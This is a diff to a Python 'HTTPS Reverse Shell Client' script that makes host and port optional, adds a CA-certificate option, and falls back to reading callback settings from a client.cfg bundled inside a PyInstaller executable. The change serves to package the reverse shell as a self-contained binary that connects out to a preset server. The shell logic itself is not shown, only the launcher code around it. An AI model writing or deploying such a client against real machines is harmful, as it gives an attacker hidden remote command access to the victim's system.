@@ -3,6 +3,7 @@
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
+import configparser
 import getpass
 import http.client
 import json
@@ -138,16 +139,43 @@ if __name__ == "__main__":
     import argparse
 
     parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Client")
-    parser.add_argument("host",
-                        type=str,
-                        metavar="<hostname/address>",
-                        help="Address or hostname of the server to connect to.")
-    parser.add_argument("-p", "--port",
-                        type=int,
-                        required=True,
-                        metavar="<port>",
-                        help="Port number exposed by the server.")
+    parser.add_argument(
+        "--host",
+        type=str,
+        metavar="<hostname/address>",
+        help="Address or hostname of the server to connect to."
+    )
+    parser.add_argument(
+        "-p", "--port",
+        type=int,
+        metavar="<port>",
+        help="Port number exposed by the server."
+    )
+    parser.add_argument(
+        "--ca-cert",
+        type=str,
+        metavar="<path>",
+        help="Path to a file containing the certificate for the Certificate "
+             "Authority (CA) in PEM format."
+    )
 
     _args = parser.parse_args()
 
-    Client(server_address=_args.host, server_port=_args.port).execute()
+    if all((_args.host, _args.port)):
+        Client(
+            server_address=_args.host,
+            server_port=_args.port,
+            ca_cert=_args.ca_cert
+        ).execute()
+    else:
+        config = configparser.ConfigParser()
+        file = config.read(Path(sys._MEIPASS).joinpath("client.cfg"))
+        if len(file) == 0:
+            raise SystemExit("Cannot initialize client without specification "
+                             "of a host and port to connect to.")
+        client_cfg = config["CLIENT"]
+        Client(
+            server_address=client_cfg.get("host"),
+            server_port=client_cfg.getint("port"),
+            ca_cert=client_cfg.get("ca-certificate")
+        ).execute()
